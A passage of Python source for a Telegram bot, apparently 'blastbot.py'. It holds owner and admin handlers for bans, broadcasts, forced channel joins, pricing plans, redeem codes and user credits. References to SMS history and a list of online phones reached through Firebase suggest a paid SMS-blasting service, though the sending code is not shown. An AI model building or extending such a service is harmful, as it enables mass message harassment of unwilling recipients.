        d["admins"].remove(del_id); save(d); await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
                                reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on"); save(d); d = load()
    await cq.answer(f"Done! {'FREE ON' if d['free_mode'] else 'Approval'}", show_alert=True)
    try: await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

# ═══════════════════════════════════════════════════════════════════
#  USERS / BAN / BROADCAST
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":"); prefix = parts[0]; page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID:",
                                reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d): await state.clear(); return
    try: ban_id = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear(); await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko nahi!"); return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id); save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Banned! <code>{ban_id}</code>",
                     reply_markup=back_kb, parse_mode="HTML")
    try: await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} You are banned.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    banned = d.get("banned", [])
    if not banned: await cq.answer("✅ No banned!", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
                                reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id); save(d)
    await cq.answer(f"✅ Unban!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try: await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Unbanned.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage bhejo:",
                                reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_admin(uid, d): await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b>...", parse_mode="HTML")
    ok = 0; fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                await msg.bot.send_message(target, f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}", parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Broadcast Done!\n✅ {ok}\n❌ {fail}",
                     reply_markup=back_kb, parse_mode="HTML")

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await cq.answer("📤 Exporting...")
    try:
        sp = os.path.abspath(__file__)
        if not os.path.exists(sp): sp = "blastbot.py"
        await cq.message.reply_document(document=FSInputFile(sp),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — {_VERSION}", parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    try: await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    cur_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in cur_ids]
    for k in [k for k in FB_DEVICE_COUNTS if k not in cur_ids]: FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices() or await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    for dv in devices[:30]:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} {dv['dev_name'][:20]} — {dv['fb_label'][:18]}")
    full = (stats_text + "\n" + "\n".join(dev_lines))[:4000]
    await cq.message.edit_text(full, reply_markup=kb([
        (f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  FORCE JOIN
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    fj = d.get("force_join", {}); channels = fj.get("channels", [])
    status = f"{em(EMOJI_CHECK, '🟢')} ON" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} OFF"
    text = f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels: text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [InlineKeyboardButton(text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
                              callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(f"{em(EMOJI_BELL, '🔗')} <b>Add Channel</b>\n\nChannel ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try: ch_id = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(f"{em(EMOJI_BELL, '🔗')} Invite link:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"): await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid link!"); return
    fsmd = await state.get_data(); ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id)); title = chat.title or "Channel"
    except: title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Channel Added!\n{title}",
                     reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels: await cq.answer("❌ No channels!", show_alert=True); return
    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>",
                                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d); await cq.answer("🗑 Removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    fj = d.setdefault("force_join", {}); fj["enabled"] = not fj.get("enabled", False)
    save(d)
    await cq.answer(f"Force Join {'ON' if fj['enabled'] else 'OFF'}!", show_alert=True)
    await owner_fj_menu(cq, state)

# ═══════════════════════════════════════════════════════════════════
#  PRICING
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, p in enumerate(plans, 1):
        text += f"{i}. <b>{p['name']}</b> — {p['price']} {p.get('currency','INR')} = {p['credits']}\n"
    rows = [[btn("ᴀᴅᴅ", "owner:pricing:add", EMOJI_CHECK, "➕")],
            [btn("ʀᴇᴍᴏᴠᴇ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💳')} <b>Add Plan</b>\n\n{sc('step 1/4')}: Plan name:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Price:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        price = float(msg.text.strip()); await state.update_data(plan_price=price)
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid price."); return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Credits:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        credits = int(msg.text.strip()); await state.update_data(plan_credits=credits)
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    await state.set_state(S.add_plan_link)
    await msg.answer(f"{em(EMOJI_MONEY, '💳')} Payment link:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"): await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid URL."); return
    fsmd = await state.get_data()
    plan = {"id": str(int(time.time())), "name": fsmd.get("plan_name", "Plan"),
            "price": fsmd.get("plan_price", 0), "credits": fsmd.get("plan_credits", 0),
            "currency": "INR", "payment_link": link}
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Plan Added!\n{plan['name']}",
                     reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans: await cq.answer("❌ No plans!", show_alert=True); return
    rows = []
    for p in plans: rows.append([btn(p["name"][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>",
                                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]; save(d)
    await cq.answer("🗑 Removed!")
    await owner_pricing_menu(cq, state)

# ═══════════════════════════════════════════════════════════════════
#  REDEEM
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for c, dat in list(codes.items())[:10]:
        st = "✅" if dat.get("uses_left", 0) > 0 else "❌"
        text += f"{st} <code>{c}</code> — 💰{dat['credits']} — {dat.get('uses_left', 0)} left\n"
    rows = [[btn("ɢᴇɴᴇʀᴀᴛᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
            [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem</b>\n\nCredits:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        credits = int(msg.text.strip()); await state.update_data(gen_credits=credits)
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"{em(EMOJI_GIFT, '🎁')} Max uses:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid (>=1)."); return
    fsmd = await state.get_data(); credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {"credits": credits, "uses_left": uses,
        "created_by": msg.from_user.id, "created_at": int(time.time()), "used_by": []}
    save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_GIFT, '🎉')} <b>Code Generated!</b>\n<code>{code}</code>\n💰 {credits}\n🔢 {uses}",
                     reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes: await cq.answer("❌ No codes!", show_alert=True); return
    rows = []
    for c in list(codes.keys())[:20]: rows.append([btn(c, f"owner:redeem:deldo:{c}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Delete Code</b>",
                                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]; save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)

# ═══════════════════════════════════════════════════════════════════
#  INDIVIDUAL CREDITS
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\nUser ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        uid = int(msg.text.strip()); await state.update_data(credit_uid=uid)
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} Amount:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try: amount = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    fsmd = await state.get_data(); uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d); save(d); await state.clear()
    try: await msg.bot.send_message(uid,
        f"{em(EMOJI_MONEY, '💰')} <b>+{amount} credits!</b>\n💳 {get_user_credits(uid, d)}", parse_mode="HTML")
    except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} {amount} → <code>{uid}</code>\n💳 {get_user_credits(uid, d)}",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\nUser ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()): await state.clear(); return
    try:
        uid = int(msg.text.strip()); await state.update_data(deduct_uid=uid)
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"{em(EMOJI_MONEY, '💰')} Amount:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try: amount = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    fsmd = await state.get_data(); uid = fsmd.get("deduct_uid")
    ok = deduct_credits(uid, amount, d); save(d); await state.clear()
    if ok:
        try: await msg.bot.send_message(uid,
            f"{em(EMOJI_WARNING, '⚠️')} -{amount} credits\n💳 {get_user_credits(uid, d)}", parse_mode="HTML")
        except: pass
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} {amount} deducted from <code>{uid}</code>",
                         reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    else:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient!",
                         reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  SETTINGS / ACTIVITY
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    s = d.get("settings", {})
    text = f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n{em(EMOJI_GIFT, '🎁')} Ref Credits: <b>{s.get('ref_credits', 3)}</b>"
    rows = [[btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Ref Credits</b>\n\nKitne?",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Ref credits: <b>{credits}</b>",
                     reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    entries = d.get("activity_log", [])[-20:]
    if not entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Nothing.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for e in reversed(entries):
            lines.append(f"[{fmt_time(e.get('timestamp', 0))}] <code>{e.get('uid', 0)}</code> — {e.get('action', '?')}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([
        (f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    all_h = d.get("sms_history", {})
    total = sum(len(v) for v in all_h.values())
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal: <b>{total}</b>",
                                reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  USER PANEL
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load(); uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                    parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d): await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d): await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML"); return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    await cq.answer(f"💰 Credits: {get_user_credits(uid, d)}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nCode bhejo:",
                                reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.redeem_code)
